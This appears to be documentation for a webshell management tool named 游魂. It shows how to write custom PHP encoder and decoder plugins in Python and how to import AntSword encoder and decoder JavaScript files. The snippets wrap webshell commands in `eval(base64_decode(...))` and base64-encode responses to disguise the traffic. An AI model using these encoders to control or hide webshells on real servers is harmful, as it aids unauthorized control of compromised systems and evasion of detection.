# 示例：自定义Encoder

TODO: 做一个添加encoder的页面

首先根据启动时打印的路径打开游魂的配置文件夹，找到其中的`modules/php_encoders`文件夹

新建python文件（如`example.py`）并往其中写入以下内容：

```python
import base64

def encode(code: str) -> str:
    return f"eval(base64_decode({base64.b64encode(code.encode()).decode()!r}));"
```

最后重启游魂即可在webshell编辑页面看到encoder

# 示例：自定义Decoder

TODO: 做一个添加decoder的页面

首先根据启动时打印的路径打开游魂的配置文件夹，找到其中的`modules/php_decoders`文件夹

新建python文件（如`example.py`）并往其中写入以下内容：

```python
import base64

phpcode = """
function decoder_echo_raw($s) {
    echo base64_encode($s);
}
"""

def decode(s: str) -> str:
    return base64.b64decode(s).decode()
```

最后重启游魂即可在webshell编辑页面看到decoder

# 示例：将蚁剑的encoder和decoder导入到游魂中

首先根据启动时打印的路径打开游魂的配置文件夹

然后在`AntSwordEncoder`或`AntSwordDecoder`中写入js文件，并重启游魂即可

比如在`AntSwordEncoder`写入文件`example-base64.js`

```js
module.exports = (pwd, data, ext={}) => {
    let randomID = `_0x${Math.random().toString(16).substr(2)}`;
    data[randomID] = Buffer.from(data['_']).toString('base64');
    data[pwd] = `eval(base64_decode($_POST[${randomID}]));`;
    delete data['_'];
    return data;
}
```

或者在`AntSwordDecoder`写入文件`example-base64.js`

```js
module.exports = {
  asoutput: () => {
    return `function asenc($out){
      return @base64_encode($out);
    }
    `.replace(/\n\s+/g, '');
  },
  decode_buff: (data, ext={}) => {
    return Buffer.from(data.toString(), 'base64');
  }
}
```

完成后可以在webshell编辑界面看到encoder

注意：游魂不支持和蚁剑内部设计高度相关的某些环境变量，某些encoder需要进行修改才能使用
